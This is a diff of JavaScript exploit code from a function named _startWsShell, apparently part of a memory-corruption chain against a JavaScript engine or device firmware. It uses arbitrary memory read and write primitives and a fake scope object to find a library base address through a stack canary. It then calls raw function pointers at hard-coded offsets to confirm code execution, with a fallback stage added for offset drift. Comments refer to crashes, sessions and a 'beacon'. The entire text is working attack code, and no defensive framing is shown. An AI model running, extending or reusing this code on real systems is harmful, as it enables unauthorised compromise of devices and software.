@@ -5238,18 +5238,19 @@ function _startWsShell(){
             var can=S.absRead(clist[ti].guardPtr,8)[0];
             ELs('canary=0x'+can.toString(16));
             if(!(can>0x1000000n)){ELs('canary looks wrong - skip');continue;}
-            ELs('CANARY CONFIRMED - base 0x'+B3.toString(16));
+            ELs('CANARY CONFIRMED - base 0x'+B3.toString(16)+' (witness deferred to the drift stage)');
+            lkBase=B3;
+            break;
           }else if(clist[ti].anchors<2){
             ELs('single anchor, no guard - skip');
             continue;
+          }else{
+            ELs('2+-anchor candidate accepted (witness deferred)');
+            lkBase=B3;
+            break;
           }
-          for(var zi=0;zi<4;zi++)S.absWrite(S.fakeScope+BigInt(zi*8),0n);
-          e2callRaw(B3+BigInt(E2_LK.gettodWrapper));
-          var tv0=S.absRead(S.fakeScope,8)[0],tv1=S.absRead(S.fakeScope+8n,8)[0];
-          ELs('tv=0x'+tv0.toString(16)+' 0x'+tv1.toString(16));
-          if(tv0>0x40000000n&&tv0<0x80000000n&&tv1<0xF4240n){lkBase=B3;reply.tv='0x'+tv0.toString(16);break;}
         }
-        if(lkBase===null){reply.log=elog;reply.err='no candidate wrote a timestamp';break;}
+        if(lkBase===null){reply.log=elog;reply.err='no candidate confirmed';break;}
         /* ---- stage 5 (v7): THE DELTA-FINGERPRINT DRIFT ----
          * Session 25: canary CONFIRMED the base, then the gettimeofday call
          * at lk+0x1B840 (the 13.60 wrapper RVA) CRASHED - the TEXT layout
@@ -5292,6 +5293,13 @@ function _startWsShell(){
           var tv2=S.absRead(S.fakeScope,8)[0],tv3=S.absRead(S.fakeScope+8n,8)[0];
           ELs('tv2=0x'+tv2.toString(16)+' 0x'+tv3.toString(16));
           if(tv2>0x40000000n&&tv2<0x80000000n&&tv3<0xF4240n){reply.tv2='0x'+tv2.toString(16);ELs('E2 WITNESS VIA DRIFT-CORRECTED WRAPPER');}
+        }else{
+          ELs('no drift pair measured - last resort: uncorrected wrapper');
+          for(var zi3=0;zi3<4;zi3++)S.absWrite(S.fakeScope+BigInt(zi3*8),0n);
+          e2callRaw(lkBase+0x1B840n);
+          var tv4=S.absRead(S.fakeScope,8)[0],tv5=S.absRead(S.fakeScope+8n,8)[0];
+          ELs('tvL=0x'+tv4.toString(16)+' 0x'+tv5.toString(16));
+          if(tv4>0x40000000n&&tv4<0x80000000n&&tv5<0xF4240n){reply.tv2='0x'+tv4.toString(16);ELs('E2 WITNESS (uncorrected)');}
         }
         /* ---- stage 4: garnish - the pid (post-witness; if the pid decodes
          * badly the CONFIRMED beacon has already landed on sync channels) ---- */
